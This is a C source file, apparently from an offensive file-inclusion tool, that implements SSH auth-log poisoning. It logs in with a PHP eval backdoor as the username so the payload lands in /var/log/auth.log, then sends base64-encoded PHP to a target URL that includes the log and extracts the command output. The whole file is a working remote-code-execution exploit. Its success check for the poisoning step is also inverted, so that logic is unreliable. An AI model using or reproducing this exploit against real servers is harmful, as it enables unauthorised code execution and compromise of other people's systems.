#include "techniques/auth-log-poison.h"
#include "request/request.h"
#include "string/utils.h"
#include "string/concat.h"
#include "string/base64.h"
#include "io/utils.h"
#include "regex/pcre.h"
#include "output.h"

#include <libssh/libssh.h>
#include <sys/mman.h>
#include <string.h>

int auth_log_poison(const char *target, int port)
{
	ssh_session ssh;
	int res = 1;

	ssh = ssh_new();
	if (ssh == NULL)
		return res;

	ssh_options_set(ssh, SSH_OPTIONS_HOST, target);

	if (port) {
		ssh_options_set(ssh, SSH_OPTIONS_PORT, &port);
	}

	if (ssh_connect(ssh) != SSH_OK) {
		printf("[-] failed to connect: %s\n", ssh_get_error(ssh));
	} else {
		if (ssh_userauth_password(ssh,
				"<?php eval(\"?>\".base64_decode($_REQUEST['kadimus'])); exit(0); ?>",
				"hereismypassword") == SSH_AUTH_ERROR) {
			printf("[-] failed to send exploit\n");
		} else {
			res = 0;
		}

		ssh_disconnect(ssh);
	}

	ssh_free(ssh);
	return res;
}

char *auth_log_rce(const char *target, const char *code)
{
	char mark[8], regex[7 * 2 + 5], *res = NULL, *inject, **matches, buf[20], *mapfile;
	int fd, size, len = 0;

	request_t req;
	FILE *fh;

	randomstr(mark, sizeof(mark));
	concatlb(regex, mark, "(.*)", mark, NULL);
	char *phpcode = concatl(mark, code, mark, NULL);
	char *b64 = b64encode(phpcode, strlen(phpcode));

	inject = concatl("kadimus=", b64, NULL);
	free(phpcode);
	free(b64);

	request_init_fh(&req);

	if ((fh = randomfile(buf, 10)) == NULL)
		die("error while generate tmp file\n");

	curl_easy_setopt(req.ch, CURLOPT_URL, target);
	curl_easy_setopt(req.ch, CURLOPT_POSTFIELDS, inject);
	curl_easy_setopt(req.ch, CURLOPT_POSTFIELDSIZE, strlen(inject));
	curl_easy_setopt(req.ch, CURLOPT_WRITEDATA, fh);

	if (request_exec(&req)) {
		free(inject);
		goto end;
	}

	free(inject);

	fclose(fh);
	fd = openro(buf);
	size = getfdsize(fd);

	if (size) {
		mapfile = (char *) mmap(0, size, PROT_READ, MAP_PRIVATE, fd, 0);
		if (mapfile != MAP_FAILED) {
			matches = regex_extract(&len, regex, mapfile, size, PCRE_DOTALL);
			if(len > 0){
				res = xstrdup(matches[0]);
				regex_free(matches, len);
			}

			munmap(mapfile, size);
		}
	}

	close(fd);
	unlink(buf);

end:
	request_free(&req);
	return res;
}

char *auth_log(url_t *url, const char *auth_file, const char *code, int pos)
{
	char *target = buildurl(url, string_replace, auth_file, pos);
	char *res = auth_log_rce(target, code);

	free(target);
	return res;
}

int check_auth_poison(const char *target)
{
	int status;

	char *rce = auth_log_rce(target, "<?php echo \"vulnerable...\"; ?>");
	if (rce && !strcmp(rce, "vulnerable...")) {
		status = 1;
		free(rce);
	} else {
		status = 0;
	}

	return status;
}

void prepare_auth_log_rce(const char *url, const char *ssh_target, int ssh_port)
{
	info("checking /var/log/auth.log poison ...\n");
	if (check_auth_poison(url)) {
		good("ok\n");
		return;
	}

	info("error, trying inject code in log file ...\n");
	if (auth_log_poison(ssh_target, ssh_port)) {
		info("log injection done, checking file ...\n");
		if (check_auth_poison(url)) {
			good("injection sucessfull\n");
		} else {
			error("error\n");
			exit(1);
		}
	} else {
		error("error\n");
		exit(1);
	}
}
